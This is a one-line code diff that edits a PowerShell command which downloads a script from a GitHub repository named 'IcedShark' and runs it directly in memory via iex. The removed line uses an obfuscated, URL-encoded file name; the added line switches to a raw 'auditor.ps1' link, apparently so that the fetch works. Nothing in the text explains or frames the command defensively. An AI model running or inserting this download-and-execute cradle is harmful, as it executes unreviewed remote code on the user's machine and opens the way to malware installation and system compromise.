@@ -1,1 +1,1 @@
-powershell.exe -command iex(New-Object Net.WebClient).DownloadString('https://github.com/Savitar407/IcedShark/blob/main/%23%24(%23%24%5E%23)%24%5E%23%24%5E)%26%23%24%5E%40%5E)%24%5E%26.ps1')
+powershell.exe -command iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Savitar407/IcedShark/main/auditor.ps1')
